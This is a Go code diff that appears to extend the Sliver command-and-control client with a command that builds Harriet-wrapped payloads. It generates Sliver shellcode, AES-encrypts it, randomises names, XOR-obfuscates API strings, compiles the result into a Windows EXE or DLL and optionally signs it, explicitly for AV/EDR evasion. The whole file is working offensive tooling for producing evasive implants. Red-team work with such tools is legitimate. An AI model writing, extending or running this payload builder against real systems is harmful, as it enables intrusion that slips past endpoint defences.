@@ -7,15 +7,21 @@ package harriet
 	Generates Sliver shellcode and wraps it with Harriet's AES-encrypted
 	C++ loader for AV/EDR evasion. Produces a signed EXE or DLL.
 
+	Uses Harriet's native EXE.sh/DLL.sh build scripts which handle:
+	  - AES encryption of shellcode
+	  - Template substitution with random variable names
+	  - XOR obfuscation of API calls
+	  - MinGW cross-compilation
+	  - Optional code signing
+
 	Requires: Harriet repo at configurable path, mingw cross-compiler,
-	Python3 for AES encryption, osslsigncode for signing.
+	Python3 with pycryptodome, osslsigncode for signing.
 */
 
 import (
 	"context"
-	"crypto/rand"
-	"encoding/hex"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -30,6 +36,23 @@ const (
 	defaultHarrietPath = "/opt/Home-Grown-Red-Team/Harriet"
 )
 
+// methodToMenuNum maps our method flag values to Harriet's interactive menu numbers.
+// Harriet EXE.sh/DLL.sh menu:
+//
+//	1) FULLAes
+//	2) FULLInj
+//	3) QueueUserAPC
+//	4) NativeAPI
+//	5) DirectSyscalls
+var methodToMenuNum = map[string]string{
+	"aes":            "1",
+	"inject":         "2",
+	"queueapc":       "3",
+	"nativeapi":      "4",
+	"directsyscall":  "5",
+	"directsyscalls": "5",
+}
+
 // HarrietGenerateCmd - Generate a Harriet-wrapped Sliver payload
 func HarrietGenerateCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 	outputName, _ := cmd.Flags().GetString("output")
@@ -38,7 +61,6 @@ func HarrietGenerateCmd(cmd *cobra.Command, con *console.SliverClient, args []st
 	method, _ := cmd.Flags().GetString("method")
 	listener, _ := cmd.Flags().GetString("listener")
 	arch, _ := cmd.Flags().GetString("arch")
-	skipSign, _ := cmd.Flags().GetBool("no-sign")
 	shellcodeFile, _ := cmd.Flags().GetString("shellcode")
 
 	if harrietPath == "" {
@@ -82,10 +104,10 @@ func HarrietGenerateCmd(cmd *cobra.Command, con *console.SliverClient, args []st
 
 	con.PrintInfof("Shellcode: %s\n", shellcodePath)
 
-	// Step 2: Set up Harriet build environment
-	con.PrintInfof("Building Harriet payload (method: %s)...\n", method)
+	// Build with Harriet's native scripts
+	con.PrintInfof("Building Harriet payload (method: %s, format: %s)...\n", method, format)
 
-	outputPath, err := buildHarrietPayload(con, harrietPath, shellcodePath, outputName, method, format, skipSign)
+	outputPath, err := buildHarrietPayload(con, harrietPath, shellcodePath, outputName, method, format)
 	if err != nil {
 		con.PrintErrorf("Harriet build failed: %s\n", err)
 		return
@@ -97,7 +119,7 @@ func HarrietGenerateCmd(cmd *cobra.Command, con *console.SliverClient, args []st
 	} else {
 		con.PrintInfof("Harriet payload ready: %s\n", outputPath)
 	}
-	con.PrintInfof("Method: %s | Format: %s | Signed: %v\n", method, format, !skipSign)
+	con.PrintInfof("Method: %s | Format: %s\n", method, format)
 }
 
 // generateSliverShellcode - Use Sliver's Generate API to create shellcode
@@ -163,144 +185,45 @@ func generateSliverShellcode(con *console.SliverClient, listener string, arch st
 	return tmpFile.Name(), nil
 }
 
-// buildHarrietPayload - Run Harriet's build process on the shellcode
-func buildHarrietPayload(con *console.SliverClient, harrietPath string, shellcodePath string, output string, method string, format string, skipSign bool) (string, error) {
-	// Determine which Harriet module to use
-	// harrietPath points to the Harriet root (e.g. /opt/Home-Grown-Red-Team/Harriet)
-	// Modules are under Harriet/Harriet/: DirectSyscalls/, FULLAes/, etc.
-	modulePath := ""
-	moduleBase := harrietPath
-	// Check for double-nested structure (Harriet/Harriet/DirectSyscalls)
-	if _, err := os.Stat(filepath.Join(harrietPath, "Harriet", "DirectSyscalls")); err == nil {
-		moduleBase = filepath.Join(harrietPath, "Harriet")
-	}
-	switch method {
-	case "aes":
-		modulePath = filepath.Join(moduleBase, "FULLAes")
-	case "inject":
-		modulePath = filepath.Join(moduleBase, "FULLInj")
-	case "queueapc":
-		modulePath = filepath.Join(moduleBase, "QueueUserAPC")
-	case "nativeapi":
-		modulePath = filepath.Join(moduleBase, "NativeAPI")
-	case "directsyscall":
-		modulePath = filepath.Join(moduleBase, "DirectSyscalls")
-	default:
-		modulePath = filepath.Join(moduleBase, "FULLAes")
-	}
-
-	if _, err := os.Stat(modulePath); os.IsNotExist(err) {
-		return "", fmt.Errorf("Harriet module not found: %s", modulePath)
-	}
-
-	// Create a working directory
-	workDir, err := os.MkdirTemp("", "harriet-build-*")
-	if err != nil {
-		return "", fmt.Errorf("failed to create work dir: %s", err)
-	}
-	defer os.RemoveAll(workDir)
-
-	// Generate random variable names for obfuscation
-	randNames := make(map[string]string)
-	for _, name := range []string{"Random1", "Random2", "Random3", "Random4", "Random5", "Random6", "Random7", "Random8", "Random9", "RandomA"} {
-		randNames[name] = randomAlpha(8)
-	}
-	xorKey := randomAlpha(16)
-
-	// Copy template
-	templateSrc := filepath.Join(modulePath, "template.cpp")
-	templateData, err := os.ReadFile(templateSrc)
-	if err != nil {
-		return "", fmt.Errorf("failed to read template: %s", err)
-	}
-	templateStr := string(templateData)
-
-	// Run AES encryption on shellcode
-	aesScript := filepath.Join(modulePath, "Resources", "aesencrypt.py")
-	if _, err := os.Stat(aesScript); os.IsNotExist(err) {
-		// Fallback: look in FULLAes module (all modules share the same encrypt script)
-		aesScript = filepath.Join(harrietPath, "FULLAes", "Resources", "aesencrypt.py")
-	}
-
-	con.PrintInfof("Encrypting shellcode with AES...\n")
-	aesOut, err := exec.Command("python3", aesScript, shellcodePath).CombinedOutput()
-	if err != nil {
-		return "", fmt.Errorf("AES encryption failed: %s\nOutput: %s", err, string(aesOut))
-	}
-
-	// Parse AES output: key and encrypted payload
-	aesOutput := string(aesOut)
-	lines := strings.Split(aesOutput, ";")
-
-	if len(lines) < 2 {
-		// Try newline split
-		lines = strings.Split(aesOutput, "\n")
-	}
-
-	keyLine := ""
-	payloadLine := ""
-	for _, line := range lines {
-		line = strings.TrimSpace(line)
-		if strings.Contains(line, "char") && !strings.Contains(line, "unsigned") {
-			keyLine = line
-		}
-		if strings.Contains(line, "unsigned char") {
-			payloadLine = line
-		}
-	}
-
-	if keyLine == "" || payloadLine == "" {
-		return "", fmt.Errorf("failed to parse AES output:\n%s", aesOutput)
-	}
-
-	// Extract key value and payload value
-	keyValue := extractCArrayValue(keyLine)
-	payloadValue := extractCArrayValue(payloadLine)
-
-	// Substitute into template
-	templateStr = strings.ReplaceAll(templateStr, "KEYVALUE", keyValue)
-	templateStr = strings.ReplaceAll(templateStr, "PAYVAL", payloadValue)
-	templateStr = strings.ReplaceAll(templateStr, "XOR_KEY", xorKey)
-	templateStr = strings.ReplaceAll(templateStr, "XOR_VARIABLE", randNames["RandomA"])
-
-	for name, value := range randNames {
-		templateStr = strings.ReplaceAll(templateStr, name, value)
-	}
-
-	// Handle XOR for VirtualAlloc string
-	xorScript := filepath.Join(modulePath, "xor.py")
-	if _, err := os.Stat(xorScript); err == nil {
-		// Copy and update xor.py with our key
-		xorData, _ := os.ReadFile(xorScript)
-		xorStr := strings.ReplaceAll(string(xorData), "XOR_KEY", xorKey)
-		tmpXor := filepath.Join(workDir, "xor.py")
-		os.WriteFile(tmpXor, []byte(xorStr), 0600)
-
-		// XOR the VirtualAlloc string
-		virtFile := filepath.Join(workDir, "virt.txt")
-		os.WriteFile(virtFile, []byte("VirtualAlloc"), 0600)
-		xorOut, err := exec.Command("python3", tmpXor, virtFile).CombinedOutput()
-		if err == nil {
-			virtXored := strings.TrimSpace(string(xorOut))
-			// Remove trailing "};" if present
-			virtXored = strings.TrimSuffix(virtXored, "};")
-			virtXored = strings.TrimSuffix(virtXored, "}")
-			templateStr = strings.ReplaceAll(templateStr, "VIRALO", virtXored+"}")
-		}
-	}
-
-	// Write modified template
-	buildFile := filepath.Join(workDir, "payload.cpp")
-	if err := os.WriteFile(buildFile, []byte(templateStr), 0600); err != nil {
-		return "", fmt.Errorf("failed to write build file: %s", err)
-	}
-
-	// Compile with mingw
-	compiler := "x86_64-w64-mingw32-g++"
+// buildHarrietPayload - Run Harriet's native EXE.sh or DLL.sh build script.
+//
+// The scripts are interactive and prompt for:
+//  1. Method selection (menu number 1-5)
+//  2. Shellcode file path
+//  3. Output filename
+//
+// We pipe these values via stdin.
+func buildHarrietPayload(con *console.SliverClient, harrietPath string, shellcodePath string, output string, method string, format string) (string, error) {
+	// Find the build script
+	scriptName := "EXE.sh"
 	if format == "dll" {
-		compiler = "x86_64-w64-mingw32-g++"
+		scriptName = "DLL.sh"
 	}
 
+	// Try multiple locations (handles double-nested Harriet/Harriet/ structure)
+	scriptPath := ""
+	candidates := []string{
+		filepath.Join(harrietPath, scriptName),
+		filepath.Join(harrietPath, "Harriet", scriptName),
+	}
+	for _, c := range candidates {
+		if _, err := os.Stat(c); err == nil {
+			scriptPath = c
+			break
+		}
+	}
+	if scriptPath == "" {
+		return "", fmt.Errorf("Harriet script %s not found. Checked:\n  %s", scriptName, strings.Join(candidates, "\n  "))
+	}
+
+	// Map method to menu number
+	menuNum, ok := methodToMenuNum[strings.ToLower(method)]
+	if !ok {
+		con.PrintWarnf("Unknown method %q, defaulting to FULLAes (1)\n", method)
+		menuNum = "1"
+	}
+
+	// Determine output path
 	outputFile := output
 	if outputFile == "" {
 		if format == "dll" {
@@ -309,81 +232,89 @@ func buildHarrietPayload(con *console.SliverClient, harrietPath string, shellcod
 			outputFile = "payload.exe"
 		}
 	}
-
 	outputPath, _ := filepath.Abs(outputFile)
 
-	compileArgs := []string{
-		"-o", outputPath,
-		buildFile,
-		"-fpermissive",
-		"-Wno-narrowing",
-		"-mwindows",
-		"-O2",
-	}
+	// Get the absolute shellcode path (Harriet scripts may cd around)
+	absShellcode, _ := filepath.Abs(shellcodePath)
 
-	if format == "dll" {
-		compileArgs = append(compileArgs, "-shared")
-	}
+	con.PrintInfof("Script: %s\n", scriptPath)
+	con.PrintInfof("Method: %s (menu option %s)\n", method, menuNum)
 
-	// Check for resource file
-	resFile := filepath.Join(harrietPath, "Resources", "resources.res")
-	if _, err := os.Stat(resFile); err == nil {
-		compileArgs = append(compileArgs, resFile)
-	}
+	// Run the Harriet script with piped stdin
+	// EXE.sh/DLL.sh expects interactive input:
+	//   Line 1: method number (1-5)
+	//   Line 2: shellcode file path
+	//   Line 3: output filename (just the name, not full path)
+	scriptDir := filepath.Dir(scriptPath)
+	cmdExe := exec.Command("bash", scriptPath)
+	cmdExe.Dir = scriptDir
 
-	con.PrintInfof("Compiling with mingw...\n")
-	compileOut, err := exec.Command(compiler, compileArgs...).CombinedOutput()
+	// Pipe the interactive inputs
+	stdin, err := cmdExe.StdinPipe()
 	if err != nil {
-		return "", fmt.Errorf("compilation failed: %s\nOutput: %s", err, string(compileOut))
+		return "", fmt.Errorf("failed to create stdin pipe: %s", err)
 	}
 
-	// Sign the binary
-	if !skipSign {
-		certPath := filepath.Join(harrietPath, "Resources", "certificate.pem")
-		keyPath := filepath.Join(harrietPath, "Resources", "private_key.pem")
+	// Capture stdout+stderr
+	var outBuf strings.Builder
+	cmdExe.Stdout = io.Writer(&outBuf)
+	cmdExe.Stderr = io.Writer(&outBuf)
 
-		if _, err := os.Stat(certPath); err == nil {
-			signedPath := outputPath + ".signed"
-			con.PrintInfof("Signing binary...\n")
-			signOut, err := exec.Command("osslsigncode", "sign",
-				"-certs", certPath,
-				"-key", keyPath,
-				"-in", outputPath,
-				"-out", signedPath,
-			).CombinedOutput()
-			if err != nil {
-				con.PrintWarnf("Signing failed (non-fatal): %s\n", string(signOut))
-			} else {
-				os.Rename(signedPath, outputPath)
-				con.PrintInfof("Binary signed successfully\n")
+	if err := cmdExe.Start(); err != nil {
+		return "", fmt.Errorf("failed to start %s: %s", scriptName, err)
+	}
+
+	// Send interactive inputs
+	fmt.Fprintf(stdin, "%s\n", menuNum)
+	fmt.Fprintf(stdin, "%s\n", absShellcode)
+	fmt.Fprintf(stdin, "%s\n", outputPath)
+	stdin.Close()
+
+	if err := cmdExe.Wait(); err != nil {
+		return "", fmt.Errorf("%s failed: %s\nOutput:\n%s", scriptName, err, outBuf.String())
+	}
+
+	con.PrintInfof("Harriet build output:\n%s\n", outBuf.String())
+
+	// Check if output was created — Harriet may place it in its own directory
+	if _, err := os.Stat(outputPath); err == nil {
+		return outputPath, nil
+	}
+
+	// Harriet sometimes outputs to its script directory with just the filename
+	outputBase := filepath.Base(outputFile)
+	altPath := filepath.Join(scriptDir, outputBase)
+	if _, err := os.Stat(altPath); err == nil {
+		// Move to requested output location
+		if mvErr := os.Rename(altPath, outputPath); mvErr != nil {
+			// If rename fails (cross-device), copy instead
+			data, rdErr := os.ReadFile(altPath)
+			if rdErr != nil {
+				return altPath, nil // Return where it actually is
 			}
+			if wrErr := os.WriteFile(outputPath, data, 0755); wrErr != nil {
+				return altPath, nil
+			}
+			os.Remove(altPath)
 		}
+		return outputPath, nil
 	}
 
-	return outputPath, nil
-}
-
-// extractCArrayValue extracts the value portion from a C array declaration
-func extractCArrayValue(line string) string {
-	// Find the = sign and extract everything after it
-	idx := strings.Index(line, "=")
-	if idx == -1 {
-		return line
+	// Search for any recently created exe/dll in the script directory
+	pattern := "*.exe"
+	if format == "dll" {
+		pattern = "*.dll"
 	}
-	value := strings.TrimSpace(line[idx+1:])
-	value = strings.TrimSuffix(value, ";")
-	return value
-}
-
-// randomAlpha generates a random alphabetic string
-func randomAlpha(length int) string {
-	b := make([]byte, length)
-	rand.Read(b)
-	s := hex.EncodeToString(b)
-	// Convert hex to alpha-only
-	result := make([]byte, length)
-	for i := 0; i < length; i++ {
-		result[i] = 'a' + (s[i] % 26)
+	matches, _ := filepath.Glob(filepath.Join(scriptDir, pattern))
+	if len(matches) > 0 {
+		// Use the most recent match
+		bestMatch := matches[len(matches)-1]
+		con.PrintWarnf("Output not at expected path, found: %s\n", bestMatch)
+		if mvErr := os.Rename(bestMatch, outputPath); mvErr != nil {
+			return bestMatch, nil
+		}
+		return outputPath, nil
 	}
-	return string(result)
+
+	return "", fmt.Errorf("build appeared to succeed but output file not found at %s\nScript output:\n%s", outputPath, outBuf.String())
 }
